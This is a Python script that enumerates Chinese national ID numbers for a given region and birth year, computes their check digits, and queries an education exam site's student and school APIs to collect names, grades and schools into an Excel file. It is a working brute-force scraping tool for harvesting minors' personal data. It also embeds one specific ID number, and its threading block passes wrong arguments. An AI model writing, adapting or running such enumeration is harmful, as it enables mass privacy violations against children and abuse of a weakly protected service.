#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib.request
#from openpyxl import Workbook
import xlsxwriter,xlrd
import json
import sys
import threading
import time  
import os
#reload(sys)  
#sys.setdefaultencoding('utf8') 
def rxlsx(xlsname):#读文件
    fname = xlsname+".xlsx"
    if not os.path.isfile(fname):
        print (u'文件路径不存在')
        sys.exit()
    data = xlrd.open_workbook(fname)            # 打开fname文件
    data.sheet_names()
    table = data.sheet_by_index(0)
    return table
def wxlsx(table,dataarray,xlsname):#保存文件
                              # 获取xls文件中所有sheet的名称
                  # 通过索引获取xls文件第0个sheet
    nrows = table.nrows                         # 获取table工作表总行数
    ncols = table.ncols                         # 获取table工作表总列数
    workbook = xlsxwriter.Workbook(xlsname+".xlsx")  #创建一个excel文件
    worksheet = workbook.add_worksheet()        #创建一个工作表对象
    worksheet.set_column(0,ncols,22)            #设定列的宽度为22像素
    #border：边框，align:对齐方式，bg_color：背景颜色，font_size：字体大小，bold：字体加粗
    red = workbook.add_format({'border':1,'align':'center','bg_color':'red','font_size':12})
    for i in range(nrows):
        worksheet.set_row(i,22)                 #设定第i行单元格属性，高度为22像素，行索引从0开始
        for j in  range(ncols):
            cell_value = table.cell_value(i,j,) #获取第i行中第j列的值
            print(cell_value)
            
            
            format = red
            worksheet.write(i,j,cell_value)      #把获取到的值写入文件对应的行列
            format.set_align('vcenter')                 #设置单元格垂直对齐
    x=0
    for data in dataarray:
       worksheet.write(nrows+x,0,data,format)
       x=x+1
         
    workbook.close()
    return "succss"


def get_data(str_sfz):
    content = {}
    url = "http://exam.jxeduyun.com/api/students/"+str_sfz
    try:
      f = urllib.request.urlopen(url)
      content = f.read()
      json_content=json.loads(content)
      #print json_content["data"]["name"]
      #print type(json_content)
      #print json_content["data"]["organization_code"]
      #newjson_content=json.dumps(json_content,ensure_ascii=False) 
      return json_content
    except : 
      
      return "a"
def get_code(str_code):
    content = {}
    url = "http://exam.jxeduyun.com/api/schools/"+str_code
    try:
      f = urllib.request.urlopen(url)
      content = f.read()
      json_content=json.loads(content)
      print (json_content)
      #print type(json_content)
      #print json_content["data"]["organization_code"]
      #newjson_content=json.dumps(json_content,ensure_ascii=False) 
      return json_content
    except : 
      
      return "a"
       

def getValidateCheckout(id17): 
    weight=[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2] #十七位数字本体码权重   
    validate=['1','0','X','9','8','7','6','5','4','3','2'] #mod11,对应校验码字符值  
    sum=0 
    mode=0 
    for i in range(0,len(id17)): 
      sum = sum + int(id17[i])*weight[i] 
      mode=sum%11 
    return validate[mode]
  
def getcardid( year, addr):
    table=rxlsx("zm")
    month=table.col_values(3)
    month=month[int(month[0]):13]
    print (month)
    day=table.col_values(4)
    day=day[int(day[0]):29]
    print(day)
    flag=table.col_values(5)
    flag=int(flag[0])
    print (flag)
    j=0
    k=100
    students=[]
   
    sfz18=""
   
    for m in month:
         
             
          for d in day:
            print(k)
            #input()
            if k==998:
               flag=100
            td=d
          #  fobj=open('/storage/emulated/0/sfz.txt','a')
            for i in range(flag,999):
               sfz17=addr+year+m+d+str(i)
               sfz18=sfz17+getValidateCheckout(sfz17)
               name=get_data(sfz18)
               print(str(m)+str(d)+str(i)+str(table.nrows))
               #print len(json.dumps(name,ensure_ascii=False))
               k=i
               
               if name!="a" and len(json.dumps(name,ensure_ascii=False))>100:
                 if get_code(str(name["data"]["organization_code"]))!="a":
                    schoolname=get_code(name["data"]["organization_code"])["name"]
                 else:
                    schoolname="--"
                 student=sfz18+name["data"]["name"]+str(name["data"]["grade_id"])+"年级"+str(name["data"]["organization_code"])+schoolname+"-"+str(i)
                 print (student)
                 students.append(student)
                 j=j+1
                 if j==10 :
                   row = 0
                   col = 3
                   ctype = 1 # 类型 0 empty,1 string, 2 number, 3 date, 4 boolean, 5 error 
                   value = m 
                   xf = 0 # 扩展的格式化 (默认是0)
                   table.put_cell(row, col, ctype, value,xf) 
                   table.put_cell(0,4,1,d,0)
                   if d==28:
                      table.put_cell(0,4,1,"01",0)
                   table.put_cell(0,5,1,i,0)
                   
                   wxlsx(table,students,"zm")
                   students.clear()
                   table=rxlsx("zm")
                   
                   j=0
    #fobj.close()
#jso=json.JSONDecoder().decode(get_data("361121200304096811"))
jso=get_data("361121200304096811")
getcardid("2002","361121")

print(rxlsx("92").col_values(1))
try:
   t1=threading.Thread(target=wxlsx,args=("2000","362321")) 
   t2=threading.Thread(target=getcardid,args=("2001","362321")) 
   #t1.start()
   #t2.start()
except:
   print ("Error: unable to start thread")
#while 1:
   #pass
